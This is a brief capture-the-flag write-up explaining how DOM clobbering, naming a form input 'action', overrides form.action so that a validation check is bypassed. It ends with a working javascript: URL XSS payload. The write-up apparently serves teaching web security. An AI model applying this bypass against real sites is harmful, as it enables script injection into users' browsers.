This is a DOM Clobbering challenge.

This script will take our json input and set the key-value to a input's name and value.

You can actually use id as variable to get the element of corresponding id or `name` attribute of some tags, and you can even override some code with this technique.

But in this case, our input are put into `name` of `<input>` tags, we cannot do the same thing as above directly, unless the form node is selected.
Example:
```html
<form action="/">
<input name="hi">
</form>

<script>
console.log(document.forms[0].action) // This should be your origin + "/"
console.log(document.forms[0].hi) // This should be the input node
</script>
```

We can use DOM Clobbering here as well!
If we rename the `name` of the `<input>` to action:
```html
<form action="/">
<input name="action">
</form>

<script>
console.log(document.forms[0].action) // This should be the input node instead of the value of action from form tag
</script>
```

And in this challenge, we can exploit that  to prevent  the action in `<form>` from being checked by overriding `action` attibute with DOM Clobbering.

Payload:
```
javascript:prompt(1)#{"action": "asd"}
```